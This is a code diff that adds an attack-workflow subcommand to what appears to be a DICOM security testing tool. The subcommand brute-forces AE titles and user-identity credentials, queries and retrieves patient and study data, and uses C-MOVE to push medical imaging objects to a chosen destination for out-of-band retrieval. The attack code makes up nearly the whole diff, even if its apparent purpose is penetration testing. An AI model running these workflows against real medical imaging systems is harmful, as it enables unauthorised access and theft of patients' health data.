@@ -872,6 +872,187 @@ def _cmd_rogue(argv: List[str]) -> int:
     return 0
 
 
+def _parse_tag(text: str):
+    """Parse a tag token 'gggg,eeee' or 'gggg,eeee,VR' into (g, e[, vr])."""
+    parts = text.split(',')
+    g = int(parts[0], 16)
+    e = int(parts[1], 16)
+    if len(parts) >= 3 and parts[2]:
+        return (g, e, parts[2])
+    return (g, e)
+
+
+def _cmd_workflow(argv: List[str]) -> int:
+    """`wf` subcommand: SCU-side attack workflows (issuer drivers).
+
+    Shares DICOMSocket with the black-box DAST path; use these to recon / brute
+    a target and to feed discovered AE titles or credentials into a DAST run.
+    """
+    try:
+        from . import workflows as wf
+        from .scapy_dicom import DICOMSocket, DEFAULT_TRANSFER_SYNTAX_UID
+    except Exception as e:  # pragma: no cover - scapy is a hard dependency
+        print(f"ERROR: workflows require scapy: {e}")
+        return 1
+
+    p = argparse.ArgumentParser(
+        prog='c-scare wf',
+        description='DICOM attack workflows (SCU issuer drivers).')
+    p.add_argument('--ip', default='127.0.0.1')
+    p.add_argument('--port', type=int, default=11112)
+    p.add_argument('--calling-ae', dest='calling_ae', default='C_SCARE')
+    p.add_argument('--timeout', type=float, default=10.0)
+    sub = p.add_subparsers(dest='wfcmd', required=True)
+
+    ab = sub.add_parser('ae-brute', help='brute-force Called AE Titles (W1)')
+    ab.add_argument('--aets', help='comma-separated AE titles')
+    ab.add_argument('--aet-file', help='file with one AE title per line')
+
+    rp = sub.add_parser('respond',
+                        help='run an SCP that exercises a connecting SCU client')
+    rp.add_argument('--host', default='0.0.0.0')
+    rp.add_argument('--ae-title', dest='ae_title', default='C_SCARE')
+    rp.add_argument('--impl-version', dest='impl_version',
+                    help='Implementation Version Name to advertise (<=16 chars)')
+    rp.add_argument('--user-id-response', dest='user_id_response',
+                    help='Type 0x59 user-identity server response to return')
+
+    cb = sub.add_parser('cred-brute', help='brute-force User Identity creds (W2)')
+    cb.add_argument('--ae-title', dest='ae_title', required=True)
+    cb.add_argument('--creds', help='comma-separated user:pass pairs')
+    cb.add_argument('--cred-file', help='file with one user:pass per line')
+    cb.add_argument('--no-stop', action='store_true',
+                    help='try all creds even after a success')
+
+    for verb, helptext in (('find', 'sculpted C-FIND (W3)'),
+                           ('move', 'C-MOVE pivot (W5)'),
+                           ('get', 'C-GET retrieval (W4)')):
+        q = sub.add_parser(verb, help=helptext)
+        q.add_argument('--ae-title', dest='ae_title', required=True)
+        q.add_argument('--level', default='study',
+                       choices=['patient', 'study', 'series', 'image'])
+        q.add_argument('--model', default='study', choices=['patient', 'study'])
+        q.add_argument('--return-key', action='append', default=[], dest='return_keys',
+                       metavar='G,E[,VR]', help='tag to request back (repeatable)')
+        q.add_argument('--match', action='append', default=[], dest='matches',
+                       metavar='G,E[,VR]=VALUE', help='matching key (repeatable)')
+        if verb == 'move':
+            q.add_argument('--dest-ae', dest='dest_ae', required=True,
+                           help='C-MOVE destination AE (the pivot target)')
+
+    a = p.parse_args(argv)
+
+    if a.wfcmd == 'respond':
+        from .responders import WorkflowResponder
+        responder = WorkflowResponder(
+            host=a.host, port=a.port, ae_title=a.ae_title,
+            implementation_version_name=a.impl_version,
+            user_identity_response=a.user_id_response)
+        print(f"[respond] WorkflowResponder on {a.host}:{a.port} "
+              f"(accepts associations, answers C-ECHO/C-FIND)  Ctrl-C to stop")
+        try:
+            responder.start(blocking=True)
+        except KeyboardInterrupt:
+            print("\n[respond] stopping")
+            responder.stop()
+        return 0
+
+    if a.wfcmd == 'ae-brute':
+        aets: List[str] = []
+        if a.aets:
+            aets += [x.strip() for x in a.aets.split(',') if x.strip()]
+        if a.aet_file:
+            with open(a.aet_file) as fh:
+                aets += [ln.strip() for ln in fh if ln.strip()]
+        if not aets:
+            print("ERROR: provide --aets or --aet-file")
+            return 1
+        results = wf.ae_brute(a.ip, a.port, aets, calling_ae=a.calling_ae,
+                              timeout=a.timeout)
+        for r in results:
+            if r.accepted:
+                print(f"[+] {r.aet}: ACCEPTED  "
+                      f"appctx={r.application_context_uid} "
+                      f"impl_uid={r.implementation_class_uid} "
+                      f"impl_ver={r.implementation_version_name}")
+            elif r.aet_recognized:
+                # Recognised AET that rejected for another reason (e.g. auth) —
+                # the AET axis is solved; pursue the next axis (W2).
+                print(f"[~] {r.aet}: RECOGNIZED but rejected ({r.reason}) "
+                      f"— AET valid, another gate remains")
+            else:
+                print(f"[-] {r.aet}: rejected ({r.reason})")
+        return 0
+
+    if a.wfcmd == 'cred-brute':
+        creds: List = []
+        if a.creds:
+            creds += [tuple(x.split(':', 1)) for x in a.creds.split(',') if ':' in x]
+        if a.cred_file:
+            with open(a.cred_file) as fh:
+                creds += [tuple(ln.strip().split(':', 1)) for ln in fh
+                          if ':' in ln]
+        if not creds:
+            print("ERROR: provide --creds or --cred-file (user:pass)")
+            return 1
+        results = wf.cred_brute(a.ip, a.port, a.ae_title, creds,
+                                calling_ae=a.calling_ae,
+                                stop_on_success=not a.no_stop, timeout=a.timeout)
+        for r in results:
+            if r.accepted:
+                payload = r.server_response
+                print(f"[+] {r.username}: ACCEPTED  0x59={payload!r}")
+            elif r.aet_problem:
+                print(f"[!] {r.username}: rejected ({r.reason}) — the Called AE "
+                      f"Title is wrong, not the credential; fix --ae-title first")
+            else:
+                print(f"[-] {r.username}: rejected ({r.reason})")
+        return 0
+
+    # find / move / get share the query-building path.
+    return_keys = [_parse_tag(t) for t in a.return_keys]
+    match_keys = {}
+    for m in a.matches:
+        key, _, value = m.partition('=')
+        match_keys[_parse_tag(key)] = value
+    query = wf.build_query(level=a.level, return_keys=return_keys,
+                           match_keys=match_keys)
+    find_uid, get_uid, move_uid = wf.QR_MODELS[a.model]
+
+    with DICOMSocket(a.ip, a.port, a.ae_title, a.calling_ae,
+                     read_timeout=a.timeout) as sock:
+        if a.wfcmd == 'find':
+            if not sock.associate({find_uid: [DEFAULT_TRANSFER_SYNTAX_UID]}):
+                print("ERROR: association failed")
+                return 1
+            responses = sock.c_find(query, sop_class_uid=find_uid)
+            pending = [d for s, d in responses if d is not None]
+            print(f"[+] {len(pending)} matching response(s)")
+            for i, ds in enumerate(pending):
+                print(f"--- response {i} ---")
+                print(ds)
+            return 0
+        if a.wfcmd == 'move':
+            if not sock.associate({move_uid: [DEFAULT_TRANSFER_SYNTAX_UID]}):
+                print("ERROR: association failed")
+                return 1
+            out = sock.c_move(query, a.dest_ae, sop_class_uid=move_uid)
+            print(f"[+] C-MOVE -> {a.dest_ae}: status=0x{(out['status'] or 0):04X} "
+                  f"completed={out['completed']} failed={out['failed']}")
+            print("    (objects delivered to the destination AE; "
+                  "retrieve them out-of-band)")
+            return 0
+        if a.wfcmd == 'get':
+            if not sock.associate({get_uid: [DEFAULT_TRANSFER_SYNTAX_UID]}):
+                print("ERROR: association failed")
+                return 1
+            out = sock.c_get(query, sop_class_uid=get_uid)
+            print(f"[+] C-GET: status=0x{(out['status'] or 0):04X} "
+                  f"objects={out['num_objects']}")
+            return 0
+    return 0
+
+
 def _cmd_greybox(argv: List[str]) -> int:
     """`greybox` subcommand: AFL++/AFLNet harness launch + crash triage."""
     from . import greybox
@@ -959,7 +1140,7 @@ def main(argv: Optional[List[str]] = None):
 
     # Matrix subcommands. With no subcommand, fall through to black-box DAST
     # mode (the --ip/--port/--category flag interface below).
-    if argv and argv[0] in ('rogue', 'corpus', 'greybox', 'dast'):
+    if argv and argv[0] in ('rogue', 'corpus', 'greybox', 'wf', 'dast'):
         sub = argv[0]
         if sub == 'rogue':
             return _cmd_rogue(argv[1:])
@@ -967,6 +1148,8 @@ def main(argv: Optional[List[str]] = None):
             return _cmd_corpus(argv[1:])
         if sub == 'greybox':
             return _cmd_greybox(argv[1:])
+        if sub == 'wf':
+            return _cmd_workflow(argv[1:])
         argv = argv[1:]  # 'dast' is the default mode: strip and continue
 
     parser = argparse.ArgumentParser(
